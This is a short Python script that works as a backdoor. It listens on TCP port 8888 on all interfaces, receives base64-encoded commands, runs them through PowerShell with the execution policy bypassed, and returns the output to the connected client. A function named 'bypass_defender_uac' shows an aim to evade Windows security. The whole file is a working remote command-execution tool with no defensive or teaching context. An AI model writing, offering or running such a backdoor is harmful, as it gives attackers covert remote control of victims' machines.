import base64
import os
import socket

def decode_command(command):
    return base64.b64decode(command).decode()

def bypass_defender_uac(command):
    return f'powershell -ExecutionPolicy Bypass -Command "{command}"'

def execute_command(command):
    return os.popen(bypass_defender_uac(command)).read()

def handle_client(conn, addr):
    while True:
        command = conn.recv(1024).decode()
        if not command:
            break
        output = execute_command(decode_command(command))
        conn.send(output.encode())

def create_socket(host, port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.bind((host, port))
    return sock

def accept_connections(sock):
    sock.listen()
    conn, addr = sock.accept()
    handle_client(conn, addr)

def main():
    sock = create_socket('0.0.0.0', 8888)
    while True:
        try:
            accept_connections(sock)
        except ConnectionResetError:
            print("Client left.")
            continue

if __name__ == "__main__":
    main()